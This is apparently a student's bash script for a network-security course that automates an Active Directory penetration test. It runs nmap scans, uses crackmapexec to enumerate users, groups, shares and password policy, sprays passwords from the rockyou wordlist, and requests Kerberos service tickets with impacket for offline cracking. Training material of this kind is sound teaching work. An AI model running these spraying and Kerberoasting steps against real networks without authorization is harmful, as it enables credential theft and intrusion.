#!/bin/bash

# Project: Domain Mapper
# Course: ZX305 - Network Security
# Author: roy mastrov
# Lecturer: zach

scan_log="scan_results.txt"
final_pdf="Domain_Mission_Report.pdf"
> "$scan_log"

# print help info if the user needs it
show_help() {
    echo "====================================================="
    echo "Domain Mapper Help:"
    echo "Just follow the prompts to enter your target and AD info."
    echo "The script will scan, enumerate, and test for vulns."
    echo "At the end, you'll get a PDF report with all the data."
    echo "====================================================="
}

echo ">>> Domain Mapper Initializing..."

# ask for wizard mode
read -p "Need help before we start? (y/n): " WIZ
[[ "$WIZ" == "y" ]] && show_help

read -p "Target IP or Range: " TARGET
read -p "Domain Name: " DOMAIN
read -p "AD Username: " USER
read -p "AD Password: " PASS

# grab wordlist, default to rockyou if left blank
read -p "Wordlist path [press enter for rockyou]: " PASSLIST
[[ -z "$PASSLIST" ]] && PASSLIST="/usr/share/wordlists/rockyou.txt"

echo "Select scan levels (0 = Skip, 1 = Basic, 2 = Mid, 3 = High)"
read -p "Scanning level: " S_LVL
read -p "Enumeration level: " E_LVL
read -p "Exploitation level: " X_LVL

# Phase 1: Scanning
if [[ "$S_LVL" != "0" ]]; then
    echo ">> Phase 1: Running network scans..."
    
    if [[ "$S_LVL" == "1" ]]; then
        nmap -Pn "$TARGET" >> "$scan_log"
    elif [[ "$S_LVL" == "2" ]]; then
        nmap -Pn -p- "$TARGET" >> "$scan_log"
    elif [[ "$S_LVL" == "3" ]]; then
        nmap -Pn -p- -sU "$TARGET" >> "$scan_log"
    fi
    echo "Done scanning."
fi


# Phase 2: Enumeration
if [[ "$E_LVL" != "0" ]]; then
    echo ">> Phase 2: Gathering info (Enum)..."
    
    # check for DC and DHCP servers first
    echo "--- Looking for DC and DHCP ---" >> "$scan_log"
    nmap -p 88 --open "$TARGET" | grep "Nmap scan report" >> "$scan_log"
    nmap -p 67 --open "$TARGET" | grep "Nmap scan report" >> "$scan_log"
    nmap -sV "$TARGET" >> "$scan_log"

    # run scripts and check common ports
    if [[ "$E_LVL" -ge 2 ]]; then
        echo "--- Running NSE scripts on key ports ---" >> "$scan_log"
        nmap -p 21,22,445,3389 --script smb-enum-shares,smb-os-discovery,http-enum "$TARGET" >> "$scan_log"
    fi

    # pull data from AD if we have credentials
    if [[ "$E_LVL" == "3" && -n "$USER" ]]; then
        echo "--- Dumping AD Data ---" >> "$scan_log"
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" --users >> "$scan_log"
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" --groups >> "$scan_log"
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares >> "$scan_log"
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" --pass-pol >> "$scan_log"
        
        # filter out the disabled and never-expires accounts
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" --users | grep -E "disabled|never-expires" >> "$scan_log"
        echo "AD extraction finished."
    fi
fi

# Phase 3: Exploitation
if [[ "$X_LVL" != "0" ]]; then
    echo ">> Phase 3: Commencing attacks..."
    
    if [[ "$X_LVL" == "1" ]]; then
        # run basic nmap vuln script
        nmap --script vuln "$TARGET" >> "$scan_log"
    elif [[ "$X_LVL" == "2" ]]; then
        # spray passwords to see what sticks
        echo "Trying password spray... this might take a while."
        crackmapexec smb "$TARGET" -u "$USER" -p "$PASSLIST" --continue-on-success >> "$scan_log"
    elif [[ "$X_LVL" == "3" ]]; then
        # try to grab kerberos tickets
        impacket-GetUserSPNs -request -dc-ip "$TARGET" "$DOMAIN/$USER" >> "$scan_log"
    fi
    echo "Attacks done."
fi


# Wrap up and generate PDF
echo ">> Saving everything to PDF..."
enscript -p report.ps "$scan_log" &> /dev/null
ps2pdf report.ps "$final_pdf" &> /dev/null

# clean up temp files
rm "$scan_log" report.ps
echo "All good! Report is saved as $final_pdf"

